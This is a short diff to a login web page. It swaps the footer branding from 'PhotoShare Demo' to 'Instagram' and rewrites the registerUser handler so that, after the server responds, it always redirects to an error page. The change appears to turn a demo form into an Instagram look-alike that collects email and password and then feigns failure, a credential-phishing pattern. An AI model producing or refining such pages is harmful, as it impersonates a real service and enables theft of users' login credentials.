@@ -529,7 +529,7 @@ footer {
 
         <br>
 
-        © 2026 PhotoShare Demo
+        © 2026   Instagram
 
     </footer>
 
@@ -561,9 +561,9 @@ async function registerUser() {
 
         const result = await response.json();
 
-        alert("please enter your email and password correctly or try again later.");
+        window.location.href = "/error.html";
     } catch (error) {
-        alert("please put your email and password");
+        alert("ERROR");
     }
 }
 document.getElementById("loginButton").addEventListener("click", registerUser);
